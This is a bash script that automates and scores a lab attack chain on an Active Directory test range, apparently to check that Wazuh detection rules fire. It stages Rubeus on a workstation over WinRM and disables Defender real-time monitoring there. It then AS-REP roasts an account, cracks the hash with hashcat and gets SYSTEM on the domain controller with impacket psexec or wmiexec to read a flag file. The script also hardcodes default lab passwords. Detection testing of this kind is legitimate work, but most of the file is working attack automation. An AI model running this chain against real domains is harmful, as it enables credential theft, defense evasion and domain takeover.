#!/usr/bin/env bash
# EWS -> DC AS-REP roast pivot test (live Proxmox vmbr1).
#
# Implements the 7-step preflight/red/blue checklist:
#   1. connectivity preflight (Kali -> EWS WinRM, Kali -> DC Kerberos/LDAP)
#   2. DC asserts (DoesNotRequirePreAuth, RC4, DA membership)
#   3. Rubeus AS-REP roast on EWS (workgroup; /user:enite /domain:.../dc:...)
#   4. hashcat -m 18200 cracks the AS-REP hash
#   5. impacket-psexec (or wmiexec fallback) lands on DC as nt authority\system
#   6. read C:\Users\Administrator\Desktop\root.txt
#   7. Wazuh asserts (rules 100700, 100716, 100715 + raw 4768 0x17 from EWS IP)
#
# Usage:
#   ./scripts/observability/ews-asrep-pivot.sh
#   ./scripts/observability/ews-asrep-pivot.sh --skip-wazuh
#   ./scripts/observability/ews-asrep-pivot.sh --run-id <id>
#
# Required env (.env auto-sourced):
#   PROXMOX_PASSWORD                          required
#   SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD     local Administrator on EWS
#   SECRETCON_DC_ROOT_FLAG                    expected flag content
#   AD_SAFEMODE_PASSWORD                      DC Administrator password
#
# Optional env:
#   CHAIN_EWS_IP / CHAIN_DC_IP / CHAIN_WAZUH_IP
#   SECRETCON_ASREP_USER (default enite)
#   SECRETCON_ASREP_PASSWORD (default stud87)
#   PIVOT_WORDLIST (defaults to validate-asrep.sh resolution)

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${REPO_ROOT}"

if [ -f .env ]; then
    set -a; source .env; set +a
fi

# shellcheck source=../lib/chain_env.sh
source "${REPO_ROOT}/scripts/lib/chain_env.sh"

SKIP_WAZUH=0
RUN_ID=""
KEEP_TUNNELS=0

while [ $# -gt 0 ]; do
    case "$1" in
        --skip-wazuh) SKIP_WAZUH=1; shift ;;
        --run-id) RUN_ID="$2"; shift 2 ;;
        --keep-tunnels) KEEP_TUNNELS=1; shift ;;
        -h|--help) sed -n '3,30p' "$0"; exit 0 ;;
        *) echo "[!] unknown flag: $1" >&2; exit 2 ;;
    esac
done

: "${PROXMOX_PASSWORD:?PROXMOX_PASSWORD must be set in .env}"

PROXMOX_HOST="${PROXMOX_HOST:-192.168.60.1}"
EWS_IP="${CHAIN_EWS_IP:-192.168.61.20}"
DC_IP="${CHAIN_DC_IP:-192.168.61.52}"
DOMAIN="${CHAIN_DOMAIN:-secretcon.local}"
ASREP_USER="${SECRETCON_ASREP_USER:-enite}"
ASREP_PASSWORD="${SECRETCON_ASREP_PASSWORD:-stud87}"
EWS_ADMIN_PW="${SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD:-PizzaMan123!}"
DC_ADMIN_PW="${AD_SAFEMODE_PASSWORD:-PizzaMan123!}"
DC_ROOT_FLAG_EXPECTED="${SECRETCON_DC_ROOT_FLAG:-asrep-root-flag-placeholder}"
ENITE_DA="${SECRETCON_ASREP_ENITE_DA:-1}"

if [ -z "$RUN_ID" ]; then
    RUN_ID="pivot-$(date -u +%Y%m%dT%H%M%SZ)"
fi
OUT_DIR="${REPO_ROOT}/artifacts/campaign/pivot/${RUN_ID}"
WAZUH_OUT="${OUT_DIR}/wazuh"
mkdir -p "$OUT_DIR" "$WAZUH_OUT"
LOG="${OUT_DIR}/run.log"
exec > >(tee -a "$LOG") 2>&1

echo "================================================="
echo "EWS -> DC AS-REP pivot test"
echo "  run-id: $RUN_ID"
echo "  out:    $OUT_DIR"
echo "  EWS=$EWS_IP  DC=$DC_IP  domain=$DOMAIN"
echo "  enite-da=$ENITE_DA  skip-wazuh=$SKIP_WAZUH"
echo "================================================="

START_TS="$(date -u +%FT%TZ)"

declare -A SCORE
for k in step1 step2 step3 step4 step5 step6 step7; do
    SCORE[$k]=0
done

step() { echo; echo "===== $1 ====="; }
ok() { echo "[+] PASS: $1"; }
bad() { echo "[!] FAIL: $1" >&2; }

# ---------------------------------------------------------------- helpers
SSHPASS_BIN="${SSHPASS_BIN:-$(command -v sshpass 2>/dev/null || true)}"
if [ -z "$SSHPASS_BIN" ] && command -v nix >/dev/null 2>&1; then
    SSHPASS_BIN="$(nix shell nixpkgs#sshpass --command sh -c 'command -v sshpass' 2>/dev/null || true)"
fi
[ -n "$SSHPASS_BIN" ] || { echo "[!] sshpass not found" >&2; exit 1; }

if ! python3 -c "import winrm" 2>/dev/null; then
    echo "[!] pywinrm required - run: nix develop" >&2
    exit 2
fi

EWS_TUNNEL_PORT="${EWS_TUNNEL_PORT:-25985}"
DC_TUNNEL_PORT="${DC_TUNNEL_PORT:-25986}"
DC_KRB_TUNNEL_PORT="${DC_KRB_TUNNEL_PORT:-28800}"
DC_LDAP_TUNNEL_PORT="${DC_LDAP_TUNNEL_PORT:-23890}"
DC_SMB_TUNNEL_PORT="${DC_SMB_TUNNEL_PORT:-24450}"

drop_tunnel() {
    local port="$1"
    pkill -f "ssh -fN -L 127.0.0.1:${port}:" 2>/dev/null || true
}

cleanup_tunnels() {
    [ "$KEEP_TUNNELS" -eq 1 ] && return
    for p in "$EWS_TUNNEL_PORT" "$DC_TUNNEL_PORT" "$DC_KRB_TUNNEL_PORT" "$DC_LDAP_TUNNEL_PORT" "$DC_SMB_TUNNEL_PORT"; do
        drop_tunnel "$p"
    done
}
trap cleanup_tunnels EXIT

open_tunnel() {
    local local_port="$1"
    local remote_host="$2"
    local remote_port="$3"
    drop_tunnel "$local_port"
    "$SSHPASS_BIN" -p "$PROXMOX_PASSWORD" ssh -fN \
        -o StrictHostKeyChecking=accept-new \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        -o LogLevel=ERROR -o ExitOnForwardFailure=yes \
        -L "127.0.0.1:${local_port}:${remote_host}:${remote_port}" \
        "root@${PROXMOX_HOST}"
    sleep 2
    if ! ss -ltn "( sport = :${local_port} )" 2>/dev/null | grep -q LISTEN; then
        bad "could not open tunnel 127.0.0.1:${local_port} -> ${remote_host}:${remote_port}"
        return 1
    fi
}

winrm_run() {
    # winrm_run <host> <port> <user> <pass> <ps-script>
    python3 - "$1" "$2" "$3" "$4" "$5" <<'PY'
import sys, winrm
host, port, user, pw, cmd = sys.argv[1:6]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=(user, pw),
                  transport="ntlm", operation_timeout_sec=120, read_timeout_sec=130)
r = s.run_ps(cmd)
sys.stdout.write(r.std_out.decode(errors='replace'))
sys.stderr.write(r.std_err.decode(errors='replace'))
sys.exit(r.status_code)
PY
}

# =================================================================
# STEP 1 - connectivity preflight
# =================================================================
step "Step 1 - connectivity preflight"

step1_pass=1

# Open EWS WinRM tunnel
if open_tunnel "$EWS_TUNNEL_PORT" "$EWS_IP" 5985; then
    ok "tunnel EWS:5985 -> 127.0.0.1:${EWS_TUNNEL_PORT}"
else
    step1_pass=0
fi

# Open DC Kerberos tunnel (TCP 88) - lets us validate from Kali too
if open_tunnel "$DC_KRB_TUNNEL_PORT" "$DC_IP" 88; then
    ok "tunnel DC:88 -> 127.0.0.1:${DC_KRB_TUNNEL_PORT}"
else
    step1_pass=0
fi
if open_tunnel "$DC_LDAP_TUNNEL_PORT" "$DC_IP" 389; then
    ok "tunnel DC:389 -> 127.0.0.1:${DC_LDAP_TUNNEL_PORT}"
else
    step1_pass=0
fi

# WinRM auth on EWS as local Administrator
EWS_HOSTNAME=""
if EWS_HOSTNAME=$(winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" "hostname" | tr -d '\r\n '); then
    ok "ews-winrm-administrator hostname=${EWS_HOSTNAME}"
else
    bad "ews-winrm-administrator (shared local admin password rejected)"
    step1_pass=0
fi

# DC connectivity from EWS perspective via WinRM Test-NetConnection
EWS_TO_DC=$(winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" \
    "(Test-NetConnection -ComputerName ${DC_IP} -Port 88 -WarningAction SilentlyContinue).TcpTestSucceeded" 2>/dev/null | tr -d '\r\n ' || echo "")
if [ "$EWS_TO_DC" = "True" ]; then
    ok "ews-can-reach-dc-88 (TcpTestSucceeded=True)"
else
    bad "ews-can-reach-dc-88 (got '$EWS_TO_DC' - check vmbr1 firewall)"
    step1_pass=0
fi

# DNS from EWS - ASREP DC's IP is its DNS server (chain mode), so secretcon.local should resolve
EWS_DNS=$(winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" \
    "(Resolve-DnsName -Name '${DOMAIN}' -Server ${DC_IP} -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress" 2>/dev/null | tr -d '\r\n ' || echo "")
if [ -n "$EWS_DNS" ] && [ "$EWS_DNS" != "" ]; then
    ok "ews-dns-${DOMAIN} = ${EWS_DNS}"
else
    echo "[~] ews-dns-${DOMAIN} did not resolve (Rubeus will use /dc:${DC_IP} explicitly, still OK)"
fi

[ "$step1_pass" -eq 1 ] && SCORE[step1]=1

# =================================================================
# STEP 2 - DC asserts (Administrator on DC via tunnel)
# =================================================================
step "Step 2 - DC asserts (DoesNotRequirePreAuth, RC4, DA membership)"

step2_pass=1

if open_tunnel "$DC_TUNNEL_PORT" "$DC_IP" 5985; then
    ok "tunnel DC:5985 -> 127.0.0.1:${DC_TUNNEL_PORT}"
else
    bad "DC WinRM tunnel"
    step2_pass=0
fi

if [ "$step2_pass" -eq 1 ]; then
    DC_PROBE=$(winrm_run 127.0.0.1 "$DC_TUNNEL_PORT" Administrator "$DC_ADMIN_PW" "@\"
\$result = @{}
\$pre = Get-ADUser -Filter {DoesNotRequirePreAuth -eq \\\$true} -Properties DoesNotRequirePreAuth -ErrorAction SilentlyContinue | Select-Object -ExpandProperty SamAccountName
\$result['preauth_users'] = @(\$pre)
\$enite = Get-ADUser -Identity '${ASREP_USER}' -Properties DoesNotRequirePreAuth,KerberosEncryptionType -ErrorAction SilentlyContinue
if (\$enite) {
    \$result['enite_present'] = \$true
    \$result['enite_preauth_disabled'] = [bool]\$enite.DoesNotRequirePreAuth
    \$result['enite_enctype'] = \"\$(\$enite.KerberosEncryptionType)\"
    \$is_da = (Get-ADPrincipalGroupMembership -Identity '${ASREP_USER}' -ErrorAction SilentlyContinue | Where-Object { \$_.Name -eq 'Domain Admins' }) -ne \$null
    \$result['enite_is_da'] = \$is_da
} else {
    \$result['enite_present'] = \$false
}
\$result | ConvertTo-Json -Compress
\"@" 2>/dev/null | tr -d '\r' || echo "{}")

    echo "$DC_PROBE" > "${OUT_DIR}/dc-probe.json"
    echo "    raw: $DC_PROBE"

    if echo "$DC_PROBE" | grep -q '"enite_present":true'; then
        ok "enite-present"
    else
        bad "enite-present"
        step2_pass=0
    fi
    if echo "$DC_PROBE" | grep -q '"enite_preauth_disabled":true'; then
        ok "enite-preauth-disabled"
    else
        bad "enite-preauth-disabled"
        step2_pass=0
    fi
    if echo "$DC_PROBE" | grep -qiE '"enite_enctype":"[^"]*RC4[^"]*"'; then
        ok "enite-enctype-rc4"
    else
        bad "enite-enctype-rc4 (got: $(echo "$DC_PROBE" | grep -oE '\"enite_enctype\":\"[^\"]*\"'))"
        step2_pass=0
    fi
    if [ "$ENITE_DA" != "0" ]; then
        if echo "$DC_PROBE" | grep -q '"enite_is_da":true'; then
            ok "enite-is-domain-admin"
        else
            bad "enite-is-domain-admin"
            step2_pass=0
        fi
    fi
fi

[ "$step2_pass" -eq 1 ] && SCORE[step2]=1

# =================================================================
# STEP 3 - Rubeus AS-REP roast on EWS
# =================================================================
step "Step 3 - Rubeus AS-REP roast on EWS"

step3_pass=1

# Ensure Rubeus is cached locally
RUBEUS_LOCAL="${REPO_ROOT}/artifacts/campaign/binaries/Rubeus.exe"
if ! "${REPO_ROOT}/scripts/observability/fetch-rubeus.sh" --check >/dev/null 2>&1; then
    echo "[*] Rubeus not cached - fetching"
    if ! "${REPO_ROOT}/scripts/observability/fetch-rubeus.sh"; then
        bad "rubeus-cache (fetch failed; pin a working RUBEUS_URL/RUBEUS_SHA256)"
        step3_pass=0
    fi
fi

if [ "$step3_pass" -eq 1 ] && [ -f "$RUBEUS_LOCAL" ]; then
    # Stage Rubeus.exe to EWS via base64 chunks; then run.
    RUBEUS_REMOTE='C:\Users\Public\Rubeus.exe'
    HASH_REMOTE='C:\Users\Public\asrep.hashes'
    RUBEUS_OUT='C:\Users\Public\rubeus-stdout.txt'

    echo "[*] staging Rubeus.exe to EWS ($(stat -c %s "$RUBEUS_LOCAL") bytes)"

    if python3 - "$EWS_TUNNEL_PORT" "$EWS_ADMIN_PW" "$RUBEUS_LOCAL" "$RUBEUS_REMOTE" <<'PY'
import sys, base64, winrm
from pathlib import Path

port, pw, local, remote = sys.argv[1:5]
data = Path(local).read_bytes()
b64 = base64.b64encode(data).decode("ascii")
chunk_size = 2 * 1024
chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

s = winrm.Session(f"http://127.0.0.1:{port}/wsman", auth=("Administrator", pw),
                  transport="ntlm", operation_timeout_sec=120, read_timeout_sec=130)

init = f"""
$ErrorActionPreference = 'Stop'
$dir = Split-Path -Parent '{remote}'
if (-not (Test-Path $dir)) {{ New-Item -ItemType Directory -Path $dir | Out-Null }}
if (Test-Path '{remote}') {{ Remove-Item -Force '{remote}' }}
"""
r = s.run_ps(init)
if r.status_code != 0:
    sys.stderr.write(r.std_err.decode(errors='replace'))
    sys.exit(1)
for idx, chunk in enumerate(chunks):
    ps = f"""
$b = [Convert]::FromBase64String('{chunk}')
$fs = [IO.File]::Open('{remote}', [IO.FileMode]::Append)
$fs.Write($b, 0, $b.Length); $fs.Close()
"""
    r = s.run_ps(ps)
    if r.status_code != 0:
        sys.stderr.write(f"chunk {idx} write failed\n")
        sys.stderr.write(r.std_err.decode(errors='replace'))
        sys.exit(2)
r = s.run_ps(f"(Get-Item '{remote}').Length")
got = r.std_out.decode(errors='replace').strip()
if got != str(len(data)):
    sys.stderr.write(f"size mismatch: expected {len(data)} got {got}\n")
    sys.exit(3)
print(f"staged {len(data)} bytes in {len(chunks)} chunks")
PY
    then
        ok "rubeus-staged"
    else
        bad "rubeus-staged"
        step3_pass=0
    fi
fi

if [ "$step3_pass" -eq 1 ]; then
    # Confirm Defender exclusion + RTP off (informational; provisioning may already have set it).
    DEF_STATE=$(winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" \
        "(Get-MpPreference).DisableRealtimeMonitoring" 2>/dev/null | tr -d '\r\n ' || echo "?")
    echo "[*] EWS Defender DisableRealtimeMonitoring = ${DEF_STATE}"
    # Best-effort hardening before invoke (idempotent).
    winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" \
        "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue" >/dev/null 2>&1 || true

    echo "[*] running Rubeus asreproast on EWS"
    RUBEUS_PS="if (Test-Path '${HASH_REMOTE}') { Remove-Item -Force '${HASH_REMOTE}' }; \
& '${RUBEUS_REMOTE}' asreproast /user:${ASREP_USER} /domain:${DOMAIN} /dc:${DC_IP} \
/format:hashcat /nowrap /outfile:'${HASH_REMOTE}' 2>&1 | Tee-Object -FilePath '${RUBEUS_OUT}'"

    if winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" "$RUBEUS_PS" \
        > "${OUT_DIR}/rubeus-stdout.txt" 2>&1; then
        ok "rubeus-asreproast-ran"
    else
        echo "[!] rubeus exited non-zero; tail:"
        tail -40 "${OUT_DIR}/rubeus-stdout.txt" || true
    fi

    # Pull hash file back
    HASH_CONTENT=$(winrm_run 127.0.0.1 "$EWS_TUNNEL_PORT" Administrator "$EWS_ADMIN_PW" \
        "if (Test-Path '${HASH_REMOTE}') { Get-Content -Raw '${HASH_REMOTE}' } else { 'MISSING' }" 2>/dev/null | sed 's/\r$//')
    if echo "$HASH_CONTENT" | grep -q '\$krb5asrep\$23\$'; then
        printf '%s' "$HASH_CONTENT" > "${OUT_DIR}/asrep.hashes"
        # strip blank lines
        grep -v '^$' "${OUT_DIR}/asrep.hashes" > "${OUT_DIR}/asrep.hashes.tmp" && \
            mv "${OUT_DIR}/asrep.hashes.tmp" "${OUT_DIR}/asrep.hashes"
        ok "asrep-hash-captured ($(wc -c < "${OUT_DIR}/asrep.hashes") bytes)"
    else
        bad "asrep-hash-captured (no \$krb5asrep\$23\$ marker)"
        step3_pass=0
    fi
fi

[ "$step3_pass" -eq 1 ] && SCORE[step3]=1

# =================================================================
# STEP 4 - hashcat crack
# =================================================================
step "Step 4 - hashcat -m 18200"

step4_pass=0

if [ -s "${OUT_DIR}/asrep.hashes" ] && command -v hashcat >/dev/null 2>&1; then
    if [ -z "${PIVOT_WORDLIST:-}" ]; then
        if [ -f /usr/share/wordlists/rockyou.txt ]; then
            PIVOT_WORDLIST=/usr/share/wordlists/rockyou.txt
        elif [ -f "${REPO_ROOT}/artifacts/asrep/wordlists/smoke.txt" ]; then
            PIVOT_WORDLIST="${REPO_ROOT}/artifacts/asrep/wordlists/smoke.txt"
        else
            PIVOT_WORDLIST=""
        fi
    fi

    if [ -f "$PIVOT_WORDLIST" ]; then
        echo "[*] hashcat with wordlist: $PIVOT_WORDLIST"
        hashcat -m 18200 -a 0 "${OUT_DIR}/asrep.hashes" "$PIVOT_WORDLIST" \
            --runtime 60 --quiet --force --potfile-path "${OUT_DIR}/hashcat.pot" \
            > "${OUT_DIR}/hashcat-run.log" 2>&1 || true
        hashcat -m 18200 --show "${OUT_DIR}/asrep.hashes" \
            --potfile-path "${OUT_DIR}/hashcat.pot" \
            > "${OUT_DIR}/hashcat.show" 2>&1 || true

        if grep -q ":${ASREP_PASSWORD}\$" "${OUT_DIR}/hashcat.show" || \
           grep -qE ":${ASREP_PASSWORD}([[:space:]]|$)" "${OUT_DIR}/hashcat.show"; then
            ok "hashcat-cracked = ${ASREP_PASSWORD}"
            step4_pass=1
        else
            bad "hashcat-cracked (expected '${ASREP_PASSWORD}'; see ${OUT_DIR}/hashcat.show)"
        fi
    else
        bad "hashcat-cracked (no wordlist)"
    fi
else
    bad "hashcat-cracked (missing hashcat or empty hashes file)"
fi

SCORE[step4]=$step4_pass

# =================================================================
# STEP 5 - impacket-psexec on DC
# =================================================================
step "Step 5 - impacket-psexec on DC"

step5_pass=0

# Open SMB tunnel through Proxmox (impacket needs 445 + DCE/RPC; psexec uses
# named pipe over SMB which works through a single tunnel as long as the
# server-side IP it advertises matches what impacket connects to).
if open_tunnel "$DC_SMB_TUNNEL_PORT" "$DC_IP" 445; then
    ok "tunnel DC:445 -> 127.0.0.1:${DC_SMB_TUNNEL_PORT}"
else
    bad "DC SMB tunnel"
fi

# impacket lookups - prefer impacket-psexec (Kali) or psexec.py (nix)
PSEXEC_BIN=""
WMIEXEC_BIN=""
for c in impacket-psexec psexec.py; do
    if command -v "$c" >/dev/null 2>&1; then PSEXEC_BIN="$c"; break; fi
done
for c in impacket-wmiexec wmiexec.py; do
    if command -v "$c" >/dev/null 2>&1; then WMIEXEC_BIN="$c"; break; fi
done

if [ -z "$PSEXEC_BIN" ] && [ -z "$WMIEXEC_BIN" ]; then
    bad "impacket-psexec/wmiexec (run inside: nix develop .#kali)"
fi

PSEXEC_OUT="${OUT_DIR}/psexec-output.txt"
PSEXEC_PATH="used"

# psexec -no-pass + -hashes is one path; we have a plaintext password from step 4 so use it.
# Note: impacket-psexec connects to <target> argument, not -target-ip; we point both at 127.0.0.1
# and rely on the SMB tunnel. SPN logic auto-resolves through DC tunnel for Kerberos auth.
PIVOT_CMD='cmd.exe /c whoami && type C:\Users\Administrator\Desktop\root.txt'

run_impacket() {
    local bin="$1"
    timeout 90 "$bin" \
        "${DOMAIN}/${ASREP_USER}:${ASREP_PASSWORD}@127.0.0.1" \
        -dc-ip 127.0.0.1 -port "$DC_SMB_TUNNEL_PORT" \
        -codec utf-8 \
        2>&1 <<EOF
$PIVOT_CMD
exit
EOF
}

if [ -n "$PSEXEC_BIN" ]; then
    echo "[*] trying ${PSEXEC_BIN}"
    PSEXEC_PATH="psexec"
    run_impacket "$PSEXEC_BIN" > "$PSEXEC_OUT" 2>&1 || true
fi

if ! grep -qiE 'nt authority\\\\system|whoami=' "$PSEXEC_OUT" 2>/dev/null && [ -n "$WMIEXEC_BIN" ]; then
    echo "[*] psexec did not land SYSTEM; trying ${WMIEXEC_BIN}"
    PSEXEC_PATH="wmiexec"
    run_impacket "$WMIEXEC_BIN" > "$PSEXEC_OUT" 2>&1 || true
fi

if grep -qi 'nt authority\\system' "$PSEXEC_OUT" 2>/dev/null; then
    ok "impacket-${PSEXEC_PATH}-system"
    step5_pass=1
else
    bad "impacket-${PSEXEC_PATH}-system (no 'nt authority\\system' in output; see ${PSEXEC_OUT})"
fi

SCORE[step5]=$step5_pass

# =================================================================
# STEP 6 - root flag exfil
# =================================================================
step "Step 6 - root flag exfil"

step6_pass=0
ROOT_FLAG_GOT=""
if [ -f "$PSEXEC_OUT" ]; then
    # The flag is on its own line. Strip impacket banner / whoami output by looking for
    # any line that matches the expected flag format if one was provided.
    # Default heuristic: the line right after the whoami output.
    ROOT_FLAG_GOT="$(awk '/[Nn][Tt] [Aa]uthority\\[Ss]ystem/ { found=1; next } found && NF { print; exit }' "$PSEXEC_OUT" | tr -d '\r')"
    if [ -z "$ROOT_FLAG_GOT" ]; then
        # Fall back: grab the longest non-empty line that isn't impacket banner
        ROOT_FLAG_GOT="$(grep -v -iE '^impacket|^\[\*\]|^\[\+\]|^\[!\]|microsoft windows|^c:\\|^\(c\)|nt authority|^\$' "$PSEXEC_OUT" \
            | awk 'NF' | tail -1 | tr -d '\r')"
    fi
    printf '%s\n' "$ROOT_FLAG_GOT" > "${OUT_DIR}/root.txt"
fi

if [ -n "$ROOT_FLAG_GOT" ]; then
    if [ "$DC_ROOT_FLAG_EXPECTED" = "asrep-root-flag-placeholder" ] || \
       [ "$ROOT_FLAG_GOT" = "$DC_ROOT_FLAG_EXPECTED" ]; then
        ok "root-flag = ${ROOT_FLAG_GOT}"
        step6_pass=1
    else
        bad "root-flag mismatch (expected '${DC_ROOT_FLAG_EXPECTED}' got '${ROOT_FLAG_GOT}')"
    fi
else
    bad "root-flag (could not extract from psexec output)"
fi

SCORE[step6]=$step6_pass

# =================================================================
# STEP 7 - Wazuh assertions
# =================================================================
step "Step 7 - Wazuh assertions"

step7_pass=0

if [ "$SKIP_WAZUH" -eq 1 ]; then
    echo "[~] --skip-wazuh requested; not draining alerts"
    SCORE[step7]=0
else
    END_TS="$(date -u +%FT%TZ)"
    echo "[*] draining alerts from $START_TS to $END_TS"
    sleep 30   # let trailing 4768/4624 events flush to manager

    DRAIN_OK=0
    if [ -n "${WAZUH_MANAGER_HOST:-}" ] && [ -f "${REPO_ROOT}/provisioning/ssh/packer_ed25519" ]; then
        # Production / Proxmox manager via ssh
        MANAGER_SSH_PROXY="${SSHPASS_BIN} -p ${PROXMOX_PASSWORD} ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=accept-new -W %h:%p root@${PROXMOX_HOST}" \
            "${REPO_ROOT}/scripts/wazuh-drain-alerts.sh" \
            --since "$START_TS" --until "$END_TS" \
            --out-dir "$WAZUH_OUT" \
            --manager-ssh "${WAZUH_MANAGER_USER:-dadmin}@${WAZUH_MANAGER_HOST:-192.168.61.10}" \
            && DRAIN_OK=1 || true
    else
        # Local docker manager
        "${REPO_ROOT}/scripts/wazuh-drain-alerts.sh" \
            --since "$START_TS" --until "$END_TS" \
            --out-dir "$WAZUH_OUT" && DRAIN_OK=1 || true
    fi

    if [ "$DRAIN_OK" -eq 1 ] && [ -f "${WAZUH_OUT}/alerts.json" ]; then
        ok "wazuh-drain"
        # Filter the raw 4768 0x17 events for the operator artifact.
        jq -c 'select(.data.win.system.eventID == "4768" and .data.win.eventdata.ticketEncryptionType == "0x17")' \
            "${WAZUH_OUT}/alerts.json" > "${WAZUH_OUT}/4768-rc4.json" 2>/dev/null || true

        rule_fired() {
            local rid="$1"
            jq -r '.rule.id // empty' "${WAZUH_OUT}/alerts.json" 2>/dev/null | grep -qx "$rid"
        }

        ALL_OK=1
        for r in 100700 100716 100715; do
            if rule_fired "$r"; then
                ok "wazuh-rule-${r}"
            else
                bad "wazuh-rule-${r} (not in drain window)"
                ALL_OK=0
            fi
        done

        if [ -s "${WAZUH_OUT}/4768-rc4.json" ]; then
            EWS_HITS=$(jq -r '.data.win.eventdata.ipAddress // empty' "${WAZUH_OUT}/4768-rc4.json" 2>/dev/null \
                | grep -c "${EWS_IP}" || echo 0)
            if [ "$EWS_HITS" -gt 0 ]; then
                ok "wazuh-4768-rc4-from-ews (count=${EWS_HITS})"
            else
                bad "wazuh-4768-rc4-from-ews (no event with ipAddress=${EWS_IP})"
                ALL_OK=0
            fi
        else
            bad "wazuh-4768-rc4 (no events filtered)"
            ALL_OK=0
        fi

        [ "$ALL_OK" -eq 1 ] && step7_pass=1
    else
        bad "wazuh-drain"
    fi
fi

SCORE[step7]=$step7_pass

# =================================================================
# Scorecard
# =================================================================
step "Scorecard"

TOTAL=0
PASS_COUNT=0
for k in step1 step2 step3 step4 step5 step6 step7; do
    TOTAL=$((TOTAL + 1))
    if [ "${SCORE[$k]}" -eq 1 ]; then
        PASS_COUNT=$((PASS_COUNT + 1))
        echo "  $k: PASS"
    else
        echo "  $k: FAIL"
    fi
done

cat > "${OUT_DIR}/scorecard.json" <<JSON
{
  "run_id": "${RUN_ID}",
  "started": "${START_TS}",
  "ended": "$(date -u +%FT%TZ)",
  "ews_ip": "${EWS_IP}",
  "dc_ip": "${DC_IP}",
  "domain": "${DOMAIN}",
  "psexec_path": "${PSEXEC_PATH:-none}",
  "results": {
    "step1_preflight":     ${SCORE[step1]},
    "step2_dc_asserts":    ${SCORE[step2]},
    "step3_rubeus_roast":  ${SCORE[step3]},
    "step4_hashcat":       ${SCORE[step4]},
    "step5_psexec_system": ${SCORE[step5]},
    "step6_root_flag":     ${SCORE[step6]},
    "step7_wazuh":         ${SCORE[step7]}
  },
  "pass": ${PASS_COUNT},
  "total": ${TOTAL}
}
JSON

echo
echo "================================================="
echo "EWS -> DC pivot: ${PASS_COUNT}/${TOTAL} PASS"
echo "  scorecard: ${OUT_DIR}/scorecard.json"
echo "================================================="

[ "$PASS_COUNT" -eq "$TOTAL" ]
